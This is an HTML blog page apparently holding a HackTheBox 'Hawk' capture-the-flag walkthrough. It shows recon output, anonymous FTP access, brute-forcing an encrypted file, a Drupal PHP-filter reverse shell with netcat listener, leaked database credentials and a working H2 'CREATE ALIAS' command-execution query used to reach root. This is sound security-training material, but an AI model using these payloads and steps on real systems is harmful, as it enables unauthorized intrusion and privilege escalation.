@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Hawk | Hawk is an easy box. I initially spent some time into trying to find a weak point in the webserver, only to find out later that the FTP server was...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Hawk</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="htts://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-05-31 01:00:00+01:00">Sun 31 May 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Hawk.html">Hawk</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Hawk.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <p>Hawk is an easy box. I initially spent some time into trying to find a weak point in the webserver, only to find out later that the FTP server was the key. Once in, is quite easy to get a shell. The part I enjoy most was the privesc to root since it involved an H2 db which was new to me.</p>
+<h1 id="recon">Recon</h1>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> nmap -sC -sV <span class="m">10</span>.10.10.102
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 23:55 BST</span>
+<span class="go">Nmap scan report for 10.10.10.102</span>
+<span class="go">Host is up (0.085s latency).</span>
+<span class="go">Not shown: 996 closed ports</span>
+<span class="go">PORT     STATE SERVICE VERSION</span>
+<span class="go">21/tcp   open  ftp     vsftpd 3.0.3</span>
+<span class="go">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span>
+<span class="go">|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages</span>
+<span class="go">| ftp-syst: </span>
+<span class="go">|   STAT: </span>
+<span class="go">| FTP server status:</span>
+<span class="go">|      Connected to ::ffff:10.10.14.15</span>
+<span class="go">|      Logged in as ftp</span>
+<span class="go">|      TYPE: ASCII</span>
+<span class="go">|      No session bandwidth limit</span>
+<span class="go">|      Session timeout in seconds is 300</span>
+<span class="go">|      Control connection is plain text</span>
+<span class="go">|      Data connections will be plain text</span>
+<span class="go">|      At session startup, client count was 3</span>
+<span class="go">|      vsFTPd 3.0.3 - secure, fast, stable</span>
+<span class="go">|_End of status</span>
+<span class="go">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span>
+<span class="go">| ssh-hostkey: </span>
+<span class="go">|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA)</span>
+<span class="go">|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA)</span>
+<span class="go">|_  256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519)</span>
+<span class="go">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span>
+<span class="go">|_http-generator: Drupal 7 (http://drupal.org)</span>
+<span class="go">| http-robots.txt: 36 disallowed entries (15 shown)</span>
+<span class="go">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span>
+<span class="go">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span>
+<span class="go">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span>
+<span class="go">|_/LICENSE.txt /MAINTAINERS.txt</span>
+<span class="go">|_http-server-header: Apache/2.4.29 (Ubuntu)</span>
+<span class="go">|_http-title: Welcome to 192.168.56.103 | 192.168.56.103</span>
+<span class="go">8082/tcp open  http    H2 database http console</span>
+<span class="go">|_http-title: H2 Console</span>
+<span class="go">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 27.40 seconds</span>
+</pre></div>
+
+
+<p>Nmap suggests there is a standard apache http server running on port 80. Navigating to <code>http://10.10.10.102</code> produces this result:</p>
+<p><img alt="" src="../images/hawk-drupal.png"></p>
+<p>I scan for directories using <code>gobuster</code>:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/hawk$</span> gobuster dir -u http://10.10.10.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt -t <span class="m">20</span>                                        
+<span class="go">===============================================================</span>
+<span class="go">Gobuster v3.0.1             </span>
+<span class="go">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span>
+<span class="go">===============================================================                                         </span>
+<span class="go">[+] Url:            http://10.10.10.102</span>
+<span class="go">[+] Threads:        20</span>
+<span class="go">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
+<span class="go">[+] Status codes:   200,204,301,302,307,401,403</span>
+<span class="go">[+] User Agent:     gobuster/3.0.1</span>
+<span class="go">[+] Extensions:     html,php,txt</span>
+<span class="go">[+] Timeout:        10s</span>
+<span class="go">===============================================================</span>
+<span class="go">2020/06/01 15:00:24 Starting gobuster</span>
+<span class="go">===============================================================</span>
+<span class="go">/search (Status: 403)</span>
+<span class="go">/misc (Status: 301)</span>
+<span class="go">/0 (Status: 200)</span>
+<span class="go">/index.php (Status: 200)</span>
+<span class="go">/themes (Status: 301)</span>
+<span class="go">/user (Status: 200)</span>
+<span class="go">/modules (Status: 301)</span>
+<span class="go">/admin (Status: 403)</span>
+<span class="go">/scripts (Status: 301)</span>
+<span class="go">/node (Status: 200)</span>
+<span class="go">/Search (Status: 403)</span>
+<span class="go">/sites (Status: 301)</span>
+<span class="go">/includes (Status: 301)</span>
+<span class="go">/install.php (Status: 200)</span>
+<span class="go">/profiles (Status: 301)</span>
+<span class="go">/update.php (Status: 403)</span>
+<span class="go">/README (Status: 200)</span>
+<span class="go">/README.txt (Status: 200)</span>
+<span class="go">/robots (Status: 200)</span>
+<span class="go">/robots.txt (Status: 200)</span>
+<span class="go">/cron.php (Status: 403)</span>
+<span class="go">/INSTALL (Status: 200)</span>
+<span class="go">/INSTALL.txt (Status: 200)</span>
+<span class="go">/LICENSE (Status: 200)                              </span>
+<span class="go">/LICENSE.txt (Status: 200)</span>
+<span class="go">/User (Status: 200)                                 </span>
+<span class="go">/Admin (Status: 403)                                </span>
+<span class="go">/Template (Status: 403)                             </span>
+<span class="go">/CHANGELOG (Status: 200)                            </span>
+<span class="go">/CHANGELOG.txt (Status: 200)</span>
+<span class="go">/xmlrpc.php (Status: 200)                           </span>
+<span class="go">/COPYRIGHT (Status: 200)                            </span>
+<span class="go">/COPYRIGHT.txt (Status: 200)</span>
+<span class="go">&lt;SNIP&gt;</span>
+</pre></div>
+
+
+<p>I started looking at the directories above one by one trying to find a weak point but did not find anything. I particularly focused on <code>xmprpc.php</code> as I know this API can let us make calls but the methods I found did not seem to be vulnerable, that is I was unable to inject anything that would give me an RCE.</p>
+<p>I then found a drupal enumeration tool online, <code>drupwn</code> and I gave it a try:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Tools/drupwn$</span> python3 drupwn --mode enum --target http://10.10.10.102
+
+<span class="go">        ____</span>
+<span class="go">       / __ \_______  ______ _      ______</span>
+<span class="go">      / / / / ___/ / / / __ \ | /| / / __ \</span>
+<span class="go">     / /_/ / /  / /_/ / /_/ / |/ |/ / / / /</span>
+<span class="go">    /_____/_/   \__,_/ .___/|__/|__/_/ /_/</span>
+<span class="go">                     /_/</span>
+
+<span class="go">[-] Version not specified, trying to identify it</span>
+
+<span class="go">[+] Version detected: 7.58</span>
+
+
+<span class="go">============ Modules ============</span>
+
+
+<span class="go">============ Custom Modules ============</span>
+
+
+<span class="go">============ Users ============</span>
+
+<span class="go">[+] ***** (id=2)</span>
+<span class="go">[+] ***** (id=1)</span>
+
+<span class="go">============ Default files ============</span>
+
+<span class="go">[+] /README.txt (200)</span>
+<span class="go">[+] /LICENSE.txt (200)</span>
+<span class="go">[+] /robots.txt (200)</span>
+<span class="go">[+] /web.config (200)</span>
+<span class="go">[+] /xmlrpc.php (200)</span>
+<span class="go">[+] /install.php (200)</span>
+<span class="go">[+] /update.php (403)</span>
+
+<span class="go">============ Nodes ============</span>
+
+
+<span class="go">============ Themes ============</span>
+
+
+<span class="go">============ Custom Themes ============</span>
+</pre></div>
+
+
+<p>Probably the only useful info is the version of Drupal, that is 7.58. </p>
+<p>Looking at the other http open port, 8082, we see this:</p>
+<p><img alt="" src="../images/hawk-8082.png"></p>
+<p>this means access to the H2 database http interface is only allowed from localhost, no remote access allowed. The <a href="https://www.h2database.com/html/main.html">H2 database</a> is an opensource java SQL database.</p>
+<p>After being stuck for a while I decided to have a look at the FTP server. <code>nmap</code> had shown an successful login so I assume anynomous authentication is allowed:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> ftp <span class="m">10</span>.10.10.102
+<span class="go">Connected to 10.10.10.102.</span>
+<span class="go">220 (vsFTPd 3.0.3)</span>
+<span class="go">Name (10.10.10.102:m4rc0ff): anonymous</span>
+<span class="go">230 Login successful.</span>
+<span class="go">Remote system type is UNIX.</span>
+<span class="go">Using binary mode to transfer files.</span>
+<span class="go">ftp&gt; ls -la</span>
+<span class="go">200 PORT command successful. Consider using PASV.</span>
+<span class="go">150 Here comes the directory listing.</span>
+<span class="go">drwxr-xr-x    3 ftp      ftp          4096 Jun 16  2018 .</span>
+<span class="go">drwxr-xr-x    3 ftp      ftp          4096 Jun 16  2018 ..</span>
+<span class="go">drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages</span>
+<span class="go">226 Directory send OK.</span>
+<span class="go">ftp&gt; cd messages</span>
+<span class="go">250 Directory successfully changed.</span>
+<span class="go">ftp&gt; ls -la</span>
+<span class="go">200 PORT command successful. Consider using PASV.</span>
+<span class="go">150 Here comes the directory listing.</span>
+<span class="go">drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 .</span>
+<span class="go">drwxr-xr-x    3 ftp      ftp          4096 Jun 16  2018 ..</span>
+<span class="go">-rw-r--r--    1 ftp      ftp           240 Jun 16  2018 .drupal.txt.enc</span>
+<span class="go">226 Directory send OK.</span>
+<span class="go">ftp&gt; get .drupal.txt.enc</span>
+<span class="go">local: .drupal.txt.enc remote: .drupal.txt.enc</span>
+<span class="go">200 PORT command successful. Consider using PASV.</span>
+<span class="go">150 Opening BINARY mode data connection for .drupal.txt.enc (240 bytes).</span>
+<span class="go">226 Transfer complete.</span>
+<span class="go">240 bytes received in 0.00 secs (3.5213 MB/s)</span>
+<span class="go">ftp&gt; exit</span>
+<span class="go">221 Goodbye.</span>
+</pre></div>
+
+
+<p>The above block shows that I was able to login anonymously to the FTP server. Once there I found a hidden file called <code>.drupal.txt.enc</code> inide the messages directory, which i download to my box. </p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> mv .drupal.txt.enc ~/Documents/htbBoxes/hawk/drupal.txt.enc
+<span class="gp">m4rc0ff@SittingDucks:~$</span> <span class="nb">cd</span> Documents/htbBoxes/hawk/
+<span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/hawk$</span> file drupal.txt.enc 
+<span class="go">drupal.txt.enc: openssl enc&#39;d data with salted password, base64 encoded</span>
+</pre></div>
+
+
+<p>The file is an encrypted text file and may contain useful information so we need to crack it. To do this we can use a tool called <a href="https://github.com/HrushikeshK/openssl-bruteforce">openssl-bruteforce</a>. The tool will do a dictionary attack with a wordlist and will try different available ciphers:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Tools/openssl-bruteforce$</span> python brute.py /usr/share/wordlists/rockyou.txt ciphers.txt ~/Documents/htbBoxes/hawk/drupal.txt.enc <span class="m">2</span>&gt; /dev/null
+<span class="go">Running pid: 25389      Cipher: AES-128-CBC</span>
+<span class="go">Running pid: 25882      Cipher: AES-128-CFB</span>
+<span class="go">Running pid: 25892      Cipher: AES-128-CFB1</span>
+<span class="go">Running pid: 25902      Cipher: AES-128-CFB8</span>
+<span class="go">Running pid: 25912      Cipher: AES-128-CTR</span>
+<span class="go">Running pid: 25922      Cipher: AES-128-ECB</span>
+<span class="go">Running pid: 26529      Cipher: AES-128-OFB</span>
+<span class="go">Running pid: 26539      Cipher: AES-192-CBC</span>
+<span class="go">Running pid: 27983      Cipher: AES-192-CFB</span>
+<span class="go">Running pid: 27993      Cipher: AES-192-CFB1</span>
+<span class="go">Running pid: 28003      Cipher: AES-192-CFB8</span>
+<span class="go">Running pid: 28013      Cipher: AES-192-CTR</span>
+<span class="go">Running pid: 28023      Cipher: AES-192-ECB</span>
+<span class="go">Running pid: 28501      Cipher: AES-192-OFB</span>
+<span class="go">Running pid: 28511      Cipher: AES-256-CBC</span>
+<span class="go">--------------------------------------------------</span>
+<span class="go">Password found with algorithm AES-256-CBC: friends</span>
+<span class="go">Data: </span>
+<span class="go">Daniel,</span>
+
+<span class="go">Following the password for the portal:</span>
+
+<span class="go">PencilKeyboardScanner123</span>
+
+<span class="go">Please let us know when the portal is ready.</span>
+
+<span class="go">Kind Regards,</span>
+
+<span class="go">IT department</span>
+
+<span class="go">--------------------------------------------------</span>
+<span class="go">&lt;SNIP&gt;</span>
+</pre></div>
+
+
+<p>After few seconds the tool was able to crack the file and we can see there is an email with a password, <code>PencilKeyboardScanner123</code>. I tried logging in with username <code>daniel</code> and the password just found but was not successful. However, I was successful with username <code>admin</code> and the same password:</p>
+<p><img alt="" src="../images/hawk-drupal-login.png"></p>
+<p>As I had already dealt with Drupal in the past I knew about the <code>php filter</code> module. This module allows for PHP code to be evaluated and it is disabled by default. With this enabled I can easily create some content containing a PHP reverse shell which will be executed once is called. So I navigate to the module page and I enable the filter:</p>
+<p><img alt="" src="../images/hawk-php-filter.png"></p>
+<p>Then I create an article containing my PHP reverse shell code:</p>
+<p><img alt="" src="../images/hawk-shell.png"></p>
+<p>Once the article is saved all I have to do is to navigate to it to get my shell. Of course I need to setup a listener first, in this case on port 443:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sudo nc -lnvp <span class="m">443</span>
+<span class="go">listening on [any] 443 ...</span>
+<span class="go">connect to [10.10.14.21] from (UNKNOWN) [10.10.10.102] 57652</span>
+<span class="go">/bin/sh: 0: can&#39;t access tty; job control turned off</span>
+<span class="gp">$</span> python3 -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+<span class="gp">www-data@hawk:/var/www/html$</span> ^Z
+<span class="go">[1]+  Stopped                 sudo nc -lnvp 443</span>
+<span class="gp">m4rc0ff@SittingDucks:~$</span> stty -a
+<span class="go">speed 38400 baud; rows 59; columns 209; line = 0;</span>
+<span class="go">intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = &lt;undef&gt;; eol2 = &lt;undef&gt;; swtch = &lt;undef&gt;; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;</span>
+<span class="go">-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts</span>
+<span class="go">-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel -iutf8</span>
+<span class="go">opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0</span>
+<span class="go">isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc</span>
+<span class="gp">m4rc0ff@SittingDucks:~$</span> stty raw -echo
+<span class="gp">m4rc0ff@SittingDucks:~$</span> sudo nc -lnvp <span class="m">443</span>
+
+<span class="gp">www-data@hawk:/var/www/html$</span> stty rows <span class="m">59</span> columns <span class="m">209</span>
+<span class="gp">www-data@hawk:/var/www/html$</span> whoami                  
+<span class="go">www-data</span>
+</pre></div>
+
+
+<p>We have a shell and I immediately upgraded to an interactive shell using the process described <a href="https://sittingducks.io/From%20basic%20shell%20to%20fully%20interactive.html">here</a>. The <code>whoami</code> command shows we are the <code>www-data</code> user.</p>
+<p>Surprisingly we had read permissions on the user flag so that I was able to grab it:</p>
+<div class="highlight"><pre><span></span><span class="gp">www-data@hawk:/var/www/html$</span> cat /home/daniel/user.txt 
+<span class="go">d5****************************a8</span>
+</pre></div>
+
+
+<p>Before doing anything I start exploring all the webserver directories and subdirectories. Inside the file <code>/var/www/html/sites/default/settings.php</code> I find this piece of information:</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="o">&lt;</span><span class="nx">SNIP</span><span class="o">&gt;</span>
+
+<span class="nv">$databases</span> <span class="o">=</span> <span class="k">array</span> <span class="p">(</span>
+  <span class="s1">&#39;default&#39;</span> <span class="o">=&gt;</span> 
+  <span class="k">array</span> <span class="p">(</span>
+    <span class="s1">&#39;default&#39;</span> <span class="o">=&gt;</span> 
+    <span class="k">array</span> <span class="p">(</span>
+      <span class="s1">&#39;database&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;drupal&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;username&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;drupal&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;password&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;drupal4hawk&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;host&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;localhost&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;port&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;driver&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;mysql&#39;</span><span class="p">,</span>
+      <span class="s1">&#39;prefix&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+    <span class="p">),</span>
+  <span class="p">),</span>
+<span class="p">);</span>
+
+<span class="o">&lt;</span><span class="nx">SNIP</span><span class="o">&gt;</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+
+
+<p>These are the credentials the webserver uses to connect to the mysql database to store or fetch data.</p>
+<p>Let's try if the password just found works with the <code>daniel</code> user account:</p>
+<div class="highlight"><pre><span></span><span class="go">www-data@hawk:/var/www/html$ su - daniel</span>
+<span class="go">Password: </span>
+<span class="go">Python 3.6.5 (default, Apr  1 2018, 05:46:30) </span>
+<span class="go">[GCC 7.3.0] on linux</span>
+<span class="go">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span>
+<span class="go">&gt;&gt;&gt;</span>
+</pre></div>
+
+
+<p>The password worked but we are on a python shell rather than the usual bash shell. Getting a bash shell is very easy:</p>
+<div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">os</span><span class="p">;</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;/bin/bash&quot;</span><span class="p">)</span>
+<span class="go">daniel@hawk:~$</span>
+</pre></div>
+
+
+<p>Good that we have a shell as <code>daniel</code> but since already got the user flag with the <code>www-data</code> user this is now very useful. What we can do though is to setup an SSH tunnel so that we will be able to access the H2 db web page from our box:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> ssh daniel@10.10.10.102 -L <span class="m">1234</span>:localhost:8082
+<span class="go">daniel@10.10.10.102&#39;s password: </span>
+<span class="go">Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64)</span>
+
+<span class="go"> * Documentation:  https://help.ubuntu.com</span>
+<span class="go"> * Management:     https://landscape.canonical.com</span>
+<span class="go"> * Support:        https://ubuntu.com/advantage</span>
+
+<span class="go">  System information as of Tue Jun  2 06:40:08 UTC 2020</span>
+
+<span class="go">  System load:  0.0               Processes:            131</span>
+<span class="go">  Usage of /:   54.1% of 9.78GB   Users logged in:      0</span>
+<span class="go">  Memory usage: 49%               IP address for ens33: 10.10.10.102</span>
+<span class="go">  Swap usage:   0%</span>
+
+
+<span class="go"> * Canonical Livepatch is available for installation.</span>
+<span class="go">   - Reduce system reboots and improve kernel security. Activate at:</span>
+<span class="go">     https://ubuntu.com/livepatch</span>
+
+<span class="go">55 packages can be updated.</span>
+<span class="go">3 updates are security updates.</span>
+
+
+<span class="go">Last login: Sun Jul  1 13:46:16 2018 from dead:beef:2::1004</span>
+<span class="go">Python 3.6.5 (default, Apr  1 2018, 05:46:30) </span>
+<span class="go">[GCC 7.3.0] on linux</span>
+<span class="go">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span>
+<span class="gp">&gt;</span>&gt;&gt;
+</pre></div>
+
+
+<p>now we are able to browse to the H2 db web page navigating to <code>http://127.0.0.1:1234</code>:</p>
+<p><img alt="" src="../images/hawk-h2web.png"></p>
+<p>I tried the same password to login but didn't work. Then I found out that if you specify a different database name instead of <code>test</code> and provide your own credentials, the system will create a new database with the new name and new credentials:</p>
+<p><img alt="" src="../images/hawk-h2dbcreation.png"></p>
+<p>Once I click on connect the db gets created and I am connected to it:</p>
+<p><img alt="" src="../images/hawk-h2connected.png"></p>
+<p>Now we are in and if we find the right query we may be able to get a shell. Searching for "h2 database reverse shell" on Google yields <a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">this page</a> as the first result. The article shows that we can easily get a RCE by creating an alias with the following query:</p>
+<div class="highlight"><pre><span></span><span class="k">CREATE</span> <span class="k">ALIAS</span> <span class="n">SHELLEXEC</span> <span class="k">AS</span> <span class="err">$$</span> <span class="n">String</span> <span class="n">shellexec</span><span class="p">(</span><span class="n">String</span> <span class="n">cmd</span><span class="p">)</span> <span class="n">throws</span> <span class="n">java</span><span class="p">.</span><span class="n">io</span><span class="p">.</span><span class="n">IOException</span> <span class="err">{</span> <span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">Scanner</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="n">getRuntime</span><span class="p">().</span><span class="k">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">).</span><span class="n">getInputStream</span><span class="p">()).</span><span class="n">useDelimiter</span><span class="p">(</span><span class="ss">&quot;\\A&quot;</span><span class="p">);</span> <span class="k">return</span> <span class="n">s</span><span class="p">.</span><span class="n">hasNext</span><span class="p">()</span> <span class="o">?</span> <span class="n">s</span><span class="p">.</span><span class="k">next</span><span class="p">()</span> <span class="p">:</span> <span class="ss">&quot;&quot;</span><span class="p">;</span>  <span class="err">}$$</span><span class="p">;</span>
+</pre></div>
+
+
+<p>So I paste this code into the SQL statement box and click on run:</p>
+<p><img alt="" src="../images/hawk-h2alias.png"></p>
+<p>then I verify I got RCE:</p>
+<p><img alt="" src="../images/hawk-h2id.png"></p>
+<p>As expected we are root and we can then read the root flag:</p>
+<p><img alt="" src="../images/hawk-rootFlag.png"></p>
+<p>This was quite easy. However, it wasn't that easy to get a root shell and I am not sure why. I tried many reverse shell one liners, probably all the ones available at pentestmonkey and some others but I  did not get a shell. In the end I ended up pushing my SSH public key into the authorized_keys file of hawk and I was able to SSH as root:</p>
+<p><img alt="" src="../images/hawk-H2rootSSH.png"></p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/.ssh$</span> ssh -i id_rsa root@10.10.10.102
+<span class="go">Enter passphrase for key &#39;id_rsa&#39;: </span>
+<span class="go">Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64)</span>
+
+<span class="go"> * Documentation:  https://help.ubuntu.com</span>
+<span class="go"> * Management:     https://landscape.canonical.com</span>
+<span class="go"> * Support:        https://ubuntu.com/advantage</span>
+
+<span class="go">  System information as of Tue Jun  2 07:09:55 UTC 2020</span>
+
+<span class="go">  System load:  0.0               Processes:            136</span>
+<span class="go">  Usage of /:   54.1% of 9.78GB   Users logged in:      1</span>
+<span class="go">  Memory usage: 56%               IP address for ens33: 10.10.10.102</span>
+<span class="go">  Swap usage:   0%</span>
+
+
+<span class="go"> * Canonical Livepatch is available for installation.</span>
+<span class="go">   - Reduce system reboots and improve kernel security. Activate at:</span>
+<span class="go">     https://ubuntu.com/livepatch</span>
+
+<span class="go">55 packages can be updated.</span>
+<span class="go">3 updates are security updates.</span>
+
+<span class="go">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span>
+
+
+<span class="go">Last login: Sat Jul 14 21:09:40 2018</span>
+<span class="gp">root@hawk:~#</span>
+</pre></div>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
